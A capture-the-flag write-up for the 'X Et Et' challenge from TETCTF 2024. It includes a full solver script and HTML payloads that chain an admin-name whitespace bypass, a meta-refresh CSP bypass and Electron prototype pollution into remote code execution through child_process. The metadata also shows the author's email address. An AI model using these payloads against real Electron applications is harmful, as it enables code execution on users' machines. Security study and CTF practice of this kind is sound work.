---
id: 6ce50311-befe-42ff-81e6-26e44a94fc64
title: X Et Et
created_time: 2024-04-30T22:46:00.000Z
last_edited_time: 2024-09-28T00:26:00.000Z
cover_image: ./imgs/pasted-image-0_YXTD005y.png
icon_emoji: ⚡
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: X Et Et
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/pasted-image-0_YXTD005y.png

---

# X Et Et Challenge Writeup (TETCTF 2024)

[`solver.py`](http://solver.py/)

```python
import httpx

URL = "<http://139.162.1.172>"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)

    def login(s, username, password):
        return s.c.post("/login", data={"username":username, "password":password})

    def register(s, username, password):
        return s.c.post("/signup", data={"username":username, "password":password, "repassword": password})

    def ticket(s, title, content, file):
        return s.c.post("/ticket", files={"file": file}, data={"title": title, "content": content}).headers['location'].replace("/ticket/", "")

    def report(s, id):
        return s.c.post("/report", data={"id": id})

    def tmp(s, temp):
        return s.c.get("/tmp/"+temp)

class API(BaseAPI):
    ...

if __name__ == "__main__":
    api = API()
    creds = "admin     "
    res = api.register(creds, creds)
    res = api.login(creds, creds)
    ticket2 = api.ticket("x", "x", open("index.html", "rb"))
    ticket4 = api.ticket(f'<meta http-equiv="refresh" content="0; url=file:///tmp/{ticket2}.html">', "x", open("index.html", "rb"))
    ticket5 = api.ticket(f'<meta http-equiv="refresh" content="0; url=file:///tmp/{ticket4}.html">', f'<http://localhost/tmp/>', open("index.html", "rb"))
    res = api.report(ticket5)
    print(res.text)
    # use existing id
    res = api.tmp("aecd5409-7936-4aab-9955-347753d92284")
    print(res.text)
    print(ticket2)

```

`index.html`

```html
<html>

<body>
    <script>
        Object.defineProperty(Object.prototype, 'x', {
            set(v) {
                // use existing id
                this.module.exports._load('child_process').execSync('/flag > /tmp/aecd5409-7936-4aab-9955-347753d92284.html')
            },
        })
        const origCall = Function.prototype.call
        Function.prototype.call = function (...args) {
            if (args.length == 4){
                window.pwn = args
                // __webpack_require__
                args[3]("x")
            }
            //console.log(this, args)
            return origCall.apply(this, args)
        }
    </script>
</body>

</html>

```

There are several steps to achieve RCE:

*   The first one is to bypass the admin.

    Here, because there is a hyphen in the session name on the login route, we can work around it by adding a space at the end or prefixing the word "admin" to gain the same privileges as the admin session.

    ```python
    @app.route('/login', methods=['GET', 'POST'])
    def login():
        if request.method == 'POST':
            data = request.form
            username = data.get('username')
            password = data.get('password')

            if username and password:
                user = User.query.filter_by(username=username).first()
                print(user)
                if user and password == user.password:
                    session['username'] = username.strip()
                    # Redirect to the home page or perform other actions upon successful login
                    return redirect(url_for('home'))
            return render_template('login.html', error_message='Invalid username or password.')
        else:
            return render_template('login.html')

    ```

    Since we have become an admin, when we create new content, `[IMPORT ALERT]` will be added to every content we create.

    ```python
        if username=="admin":
            content = "[IMPORTANT ALERT]"+ content
        else:
            content = "[NOMAL ALERT]"+ content

    ```

    With that, we can trigger the code below to gain access to the window with more lenient permissions.    `challenge/app/index.html`

    ```plain text
            if(atob(envVariables.content).startsWith("[IMPORTANT ALERT]")){
            electron.send("CreateViewer",atob(window.envVariables.id));}

    ```

    Where `CreateViewer` will pop up a window with permissions in the code below:

    ```plain text
    function createNotificationWindow(id) {

      child = new BrowserWindow({
        width: 300,
        height: 200,
        webPreferences: {
          //preload: no need preload expose
          sandbox: false,
          contextIsolation: false,
          webgl: true,
          webSecurity: false,
          nodeIntegrationInSubFrames: false, // dont allow call ipc from iframe/child windows
        }
      })


      child.loadURL("<http://localhost/IsNew?id=>"+id)

    }

    ```

    The permissions `sandbox: false` and `contextIsolation: false` can be used to influence the context at the preload level, where functions like `this.module` are available. We can utilize these functions to achieve Remote Code Execution (RCE).

    For more information, you can check the Harmony challenge on HITCON CTF 2023.
    [https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON CTF 2023/Harmony#rce-using-client-side-prototype-pollution](https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202023/Harmony#rce-using-client-side-prototype-pollution)

*   We perform sandbox bypass by using the Prototype Pollution technique.

    Here, I'm polluting two constructors: the Object constructor and the Function constructor.

    ```plain text
            Object.defineProperty(Object.prototype, 'x', {
                set(v) {
                    // use existing id
                    this.module.exports._load('child_process').execSync('/flag > /tmp/aecd5409-7936-4aab-9955-347753d92284.html')
                },
            })
            const origCall = Function.prototype.call
            Function.prototype.call = function (...args) {
                if (args.length == 4){
                    // __webpack_require__
                    args[3]("x")
                }
                //console.log(this, args)
                return origCall.apply(this, args)
            }

    ```

    Where I use the Function prototype to perform hooking on every call. By doing this hooking, there is an opportunity to obtain an object from another context, where the `__webpack_require__` function may be present.

    After that, we prototype the Object. So when an object accesses the array key `x`, it will trigger the hooking we set up in the `defineProperty` within our prototype pollution.

    As a result, when we call `x` with the `__webpack_require__` function, it will be triggered, allowing us to leak the `this.module` function.

*   Bypassing CSP using the meta refresh tag.

    Since there is strict CSP when the popup is opened, we cannot execute JavaScript directly. Therefore, we need to bypass it. Here, we can bypass it by adding a ticket with the title `<meta http-equiv="refresh" content="0; url=file:///tmp/{ticket}.html">` to redirect to the file we uploaded on the ticket form page. With this, we can execute JavaScript without being hindered by CSP.

Those are the steps required to work on this challenge. For the rest, you can refer to the solve script above to see the execution flow.

## After The CTF

After the CTF ended, the author shared their solve script, and I discovered that you can simply import the module using `__webpack_require__` to achieve Remote Code Execution (RCE):

```html
<script>
const orgCall = Function.prototype.call;
Function.prototype.call = function(...args){
    if(args[3] && args[3].name == "__webpack_require__"){
        const __webpack_require__ = args[3];
        var cc = __webpack_require__('module')._load('child_process').exec('"""+rce+"""');

    }
    return orgCall.apply(this,args);
}</script>

```
